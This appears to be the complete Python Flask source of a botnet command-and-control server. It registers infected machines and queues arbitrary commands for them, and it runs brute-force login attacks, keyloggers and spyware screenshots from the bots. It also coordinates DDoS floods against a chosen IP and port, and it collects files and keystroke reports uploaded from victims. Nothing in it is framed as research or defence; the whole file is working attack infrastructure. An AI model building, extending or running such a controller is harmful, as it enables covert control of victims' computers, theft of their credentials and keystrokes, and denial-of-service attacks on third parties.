from flask import Flask, request, jsonify, render_template, redirect, url_for, send_file
from collections import defaultdict, deque
import time
import json, os
from io import BytesIO

app = Flask(__name__)

BOT_DB_FILE = "bot_registry.json"
bots = {}  # Tracks bot metadata (ID → info)
commands = defaultdict(deque)  # Commands to be sent to each bot
reports = {}  # Reports received from bots (ID → list of reports)
last_commands = {}  # Last command sent to each bot (ID → command)
pending = defaultdict(list)  # Commands sent but not yet reported back (ID → [(cmd, timestamp)])
keylogger_status = {}  # Whether keylogger is currently running on each bot (ID → bool)
wake_requests = set()  # Bots that should be immediately contacted via wake endpoint


# for screenshots
UPLOAD_DIR = os.path.join("static", "uploads")
os.makedirs(UPLOAD_DIR, exist_ok=True)

def utc_now():
    return time.strftime("%Y-%m-%d %H:%M:%S UTC", time.gmtime())

# loads database file
def load_bot_db():
    if os.path.exists(BOT_DB_FILE):
        if os.path.getsize(BOT_DB_FILE) == 0:
            return {}  # Empty file
        with open(BOT_DB_FILE, "r") as f:
            try:
                return json.load(f)
            except json.JSONDecodeError:
                print("[!] Warning: Corrupted bot DB JSON. Resetting...")
                return {}
    return {}

# saves the data to database file
def save_bot_db(data):
    with open(BOT_DB_FILE, "w") as f:
        json.dump(data, f, indent=2)

# Get list of bots that are currently online (active within last 60 seconds) this is for ddos
def get_online_bots():
    return [
        {"id": b_id, "ip": info["ip"]}
        for b_id, info in bots.items()
        if time.time() - info["last_seen"] < 60
    ]

# dashboard
@app.route("/")
def index():
    current_time = time.time()
    bot_statuses = []
    for bot_id, info in bots.items():
        online = current_time - info["last_seen"] < 60
        bot_statuses.append({
            "id": bot_id,
            "ip": info.get("ip", "unknown"),
            "online": online,
            "whoami": info.get("whoami", "N/A")
        })
    return render_template("index.html", bots=bot_statuses)


# attacks which you can perform on bot with bot id
@app.route("/bot/<bot_id>", methods=["GET", "POST"])
def bot_detail(bot_id):
    if bot_id not in bots:
        return jsonify({"error": "unknown bot"}), 404

    return render_template("bot.html", bot_id=bot_id)


# Endpoint for bots to register or update their status/info in memory and persistent DB
@app.route("/register", methods=["POST"])
def register():
    data = request.json
    bot_id = data.get("id")
    whoami = data.get("whoami")
    os_name = data.get("os", "unknown")
    hostname = data.get("hostname", "unknown")
    platform_name = data.get("platform", "unknown")
    now = time.time()
    ip_addr = request.remote_addr

    # Update in-memory tracker
    bots.setdefault(bot_id, {
        "ip": ip_addr,
        "whoami": whoami,
        "os": os_name,
        "hostname": hostname,
        "platform": platform_name,
        "last_seen": now
    })
    bots[bot_id].update({
        "ip": ip_addr,
        "whoami": whoami,
        "os": os_name,
        "hostname": hostname,
        "platform": platform_name,
        "last_seen": now
    })

    # Store to registry file
    registry = load_bot_db()
    registry[bot_id] = {
        "ip": ip_addr,
        "mac": bot_id,
        "whoami": whoami,
        "os": os_name,
        "hostname": hostname,
        "platform": platform_name,
        "registered_at": registry.get(bot_id, {}).get("registered_at", utc_now()),
        "last_seen": utc_now()
    }
    save_bot_db(registry)

    print(f"[+] Bot registered: {bot_id} from {ip_addr}")
    return {"status": "registered"}


# API endpoint for a bot to fetch its next command(s)
# - Updates bot's last seen time
# - Prevents command flooding by checking pending/in-flight commands
# - If no flood detected, sends queued commands and marks them as pending
@app.route("/get_command/<bot_id>", methods=["GET"])
def get_command(bot_id):
    if bot_id not in bots:
        return jsonify({"error": "unknown bot"}), 404

    # Mark bot as active
    bots[bot_id]["last_seen"] = time.time()

    # Prevent flooding: Do not send more commands if previous ones are still pending
    # unless they were sent more than 15 seconds ago
    in_flight = pending[bot_id]
    if len(in_flight) >= 1 and all(time.time() - sent_time < 15 for _, sent_time in in_flight):
        return jsonify({"cmds": [], "sent_at": ""})

    # Send all currently queued commands to the bot
    cmds = list(commands[bot_id])
    commands[bot_id].clear()

    # Mark commands as pending with current timestamp
    now = time.time()
    pending[bot_id].extend((cmd, now) for cmd in cmds)

    return jsonify({"cmds": cmds, "sent_at": utc_now()})


# report got from bot and adding it to reports
@app.route("/report", methods=["POST"])
def report():
    data = request.json
    bot_id = data.get("id")
    sent_at = data.get("sent_at")
    cmd = data.get("cmd")
    output = data.get("output", "")
    received_at = utc_now()

    if bot_id not in bots:
        return {"status": "unknown_bot"}, 404
    
    if cmd == "spyware" and "Screenshot saved at:" in output:
        try:
            lines = output.strip().split('\n')
            screenshot_line = lines[-1]
            if screenshot_line:
                file_path = screenshot_line.split(" ")[-1].strip()
                print(file_path)
                file_name = os.path.basename(file_path)
                file_url = f"{request.host_url.rstrip('/')}/static/uploads/{bot_id}/{file_name}"
                output += f"\nScreenshot URL: {file_url}"
        except Exception as e:
            print(f"[!] Could not extract screenshot URL: {e}")

    reports.setdefault(bot_id, []).append({
        "command": cmd,
        "output": output,
        "sent_at": sent_at,
        "received_at": received_at
    })


    # remove from pending if needed
    if cmd and bot_id in pending:
        pending[bot_id] = [p for p in pending[bot_id] if p[0] != cmd]

    print(f"[{received_at}] Report from {bot_id} [{cmd}]: {output}")
    return {"status": "received"}

# sending the data to output box which acts as terminal
@app.route("/api/report/<bot_id>")
def api_report(bot_id):
    return jsonify(reports.get(bot_id, []))


# API endpoint to send a command to a bot
# Appends the command to the bot's command queue and updates the last command
@app.route("/send_command", methods=["POST"])
def send_command():
    data = request.json
    bot_id = data.get("id")
    command = data.get("cmd")
    commands[bot_id].append(command)
    last_commands[bot_id] = command
    return {"status": "sent"}


# Handles launching specific attacks (bruteforce, keylogger, etc.) via bot ID
@app.route("/bot/<bot_id>/attack/<command>", methods=["GET", "POST"])
def launch_attack(bot_id, command):
    if request.method == "POST":

        if command == "bruteforce":
            service = request.form.get("service")
            ip = request.form.get("ip")
            url = request.form.get("url")
            username = request.form.get("username")
            wordlist = request.form.get("wordlist")
            u_field = request.form.get("u_field", "username")
            p_field = request.form.get("p_field", "password")

            if service == "http":
                cmd = f"bruteforce http {url} {username} {wordlist} {u_field} {p_field}"
            else:
                cmd = f"bruteforce {service} {ip} {username} {wordlist}"

        elif command == "keylogger":
            action = request.form.get("action")
            if action == "Start Attack":
                cmd = "keylogger start"
                keylogger_status[bot_id] = True
            elif action == "Stop Attack":
                cmd = "keylogger stop"
                keylogger_status[bot_id] = False

        else:
            cmd = command

        if cmd:
            commands[bot_id].append(cmd)
            last_commands[bot_id] = cmd
            wake_requests.add(bot_id)

        return redirect(url_for("launch_attack", bot_id=bot_id, command=command))

    command_reports = [r for r in reports.get(bot_id, []) if r.get("command", "").startswith(command)]

    return render_template("attack.html", bot_id=bot_id, command=command, reports=command_reports or None, running=keylogger_status.get(bot_id, False) if command == "keylogger" else None)


@app.route("/ddos", methods=["GET", "POST"])
def launch_ddos():
    if request.method == "POST":
        target_ip = request.form.get("target_ip")
        target_port = request.form.get("target_port")
        packets = int(request.form.get("packets", 1000))
        delay = float(request.form.get("delay", 0.01))
        threads = int(request.form.get("threads", 10))
        selected_bots = request.form.getlist("bots")

        cmd = f"ddos {target_ip} {target_port} {packets} {delay} {threads}"
        for bot in selected_bots:
            commands[bot].append(cmd)
            last_commands[bot] = cmd
            wake_requests.add(bot)

        return redirect(url_for("launch_ddos"))

    online_bots = get_online_bots()
    return render_template("ddos.html", online_bots=online_bots)


# for downloading the latest reports
@app.route("/bot/<bot_id>/report/<command>/download", methods=["GET"])
def download_latest_report(bot_id, command):
    report_list = reports.get(bot_id, [])
    filtered = [r for r in report_list if r.get("command", "").startswith(command)]

    if not filtered:
        return "No reports available", 404

    # Get the latest report (assumed to be the last one)
    latest = filtered[-1]
    timestamp = latest.get("received_at", "unknown_time").replace(":", "-").replace(" ", "_")
    filename = f"{bot_id}_{command}_{timestamp}.txt"
    content = f"--- Report (Sent: {latest['sent_at']}, Received: {latest['received_at']}) ---\n{latest.get('output', '[!] No output')}"
    
    return send_file(BytesIO(content.encode()), mimetype="text/plain", as_attachment=True, download_name=filename)


# files recived from uploading to server
@app.route('/upload/<bot_id>', methods=['POST'])
def upload_file(bot_id):
    if 'file' not in request.files:
        return "No file", 400

    file = request.files['file']
    filename = request.form.get("file_name") or file.filename
    if file.filename == '':
        return "Empty filename", 400

    bot_dir = os.path.join(UPLOAD_DIR, bot_id)
    os.makedirs(bot_dir, exist_ok=True)
    
    path = os.path.join(bot_dir, filename)
    file.save(path)

    url = f"/static/uploads/{bot_id}/{filename}"
    return url 

# Manually queue a wake signal for the specified bot
@app.route("/wake/<bot_id>", methods=["POST"])
def wake_bot(bot_id):
    wake_requests.add(bot_id)
    print(f"[+] Wake signal queued for {bot_id}")
    return {"status": "wake_signal_queued"}


# Bot polls this endpoint to check if it should wake up
@app.route("/wake/<bot_id>")
def bot_wake_poll(bot_id):
    if bot_id in wake_requests:
        print(f"[+] Wake signal sent to {bot_id}")
        wake_requests.remove(bot_id)
        return jsonify({"wake": True})
    return jsonify({"wake": False})


# On startup: Load previously registered bots and mark them as offline
if __name__ == "__main__":
    if not os.path.exists(BOT_DB_FILE):
        with open(BOT_DB_FILE, "w") as f:
            f.write("{}")
    bots_db = load_bot_db()
    for bot_id, info in bots_db.items():
        bots[bot_id] = {
            "ip": info.get("ip", ""),
            "whoami": info.get("whoami", ""),
            "hostname": info.get("hostname", ""),
            "platform": info.get("platform", ""),
            "os": info.get("os", ""),
            "last_seen": time.time() - 1000 # Marks as offline or online
        }
        wake_requests.add(bot_id)
    app.run(host="0.0.0.0", port=5000, debug=True)
